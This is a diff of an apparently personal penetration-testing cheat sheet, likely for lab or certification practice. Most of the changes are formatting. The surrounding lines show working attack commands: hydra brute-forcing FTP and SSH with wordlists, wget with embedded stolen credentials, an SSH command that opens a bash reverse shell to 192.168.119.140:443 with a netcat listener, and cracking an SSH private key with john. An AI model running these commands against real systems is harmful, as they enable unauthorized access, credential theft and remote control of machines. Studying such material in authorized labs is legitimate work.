@@ -57,9 +57,11 @@ hydra -l steph -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.68 -t 
 hydra -l steph -P /usr/share/wordlists/rockyou.txt 10.1.1.68 -t 4 ftp
 ````
 ##### Downloading files recursively
+
 ````
 wget -r ftp://steph:billabong@10.1.1.68/
 ````
+
 ````
 find / -name Settings.*  2>/dev/null #looking through the files
 ````
@@ -67,12 +69,14 @@ find / -name Settings.*  2>/dev/null #looking through the files
 #### SSH port 22
 ##### Emumeration
 ##### Exploitation
+
 ````
 ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa bob@10.11.1.141 -t 'bash -i >& /dev/tcp/192.168.119.140/443 0>&1'
 
 nc -nvlp 443
 ````
 ###### no matching key exchange method found.
+
 ````
 ssh -oKexAlgorithms=+diffie-hellman-group1-sha1\
  -oHostKeyAlgorithms=+ssh-rsa\
@@ -80,6 +84,7 @@ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1\
  admin@10.11.1.252 -p 22000
 ````
 ##### Brute Force
+
 ````
 hydra -l megan -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.27 -t 4 ssh
 ````
@@ -89,21 +94,25 @@ chmod 600 id_rsa
 ssh mario@172.16.138.14 -i id_rsa
 ````
 ##### Cracking Private key
+
 ````
 ssh2john id_ecdsa > id_ecdsa.hash
 john --wordlist=/usr/share/wordlists/rockyou.txt id_ecdsa.hash
 fireball         (id_ecdsa)
 ````
 ##### Path to keys
+
 ````
 /etc/ssh/*pub #Use this to find the type of key
 
 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK6SiUV5zqxqNJ9a/p9l+VpxxqiXnYri40OjXMExS/tP0EbTAEpojn4uXKOgR3oEaMmQVmI9QLPTehCFLNJ3iJo= root@web01
 `````
+
 `````
 /home/anita/.ssh/id_ecdsa.pub #Use this to confirm the above exists
 /home/anita/.ssh/id_ecdsa #Use this to confirm the private key exists
 ````
+
 #### Telnet port 23
 ##### Login
 ````
@@ -392,7 +401,7 @@ HOP RTT       ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 32.21 seconds
-`````
+````
 
 ![image](https://user-images.githubusercontent.com/127046919/234426419-f8aa53ae-f5f7-4815-92d5-99dfde8ba5fb.png)
 
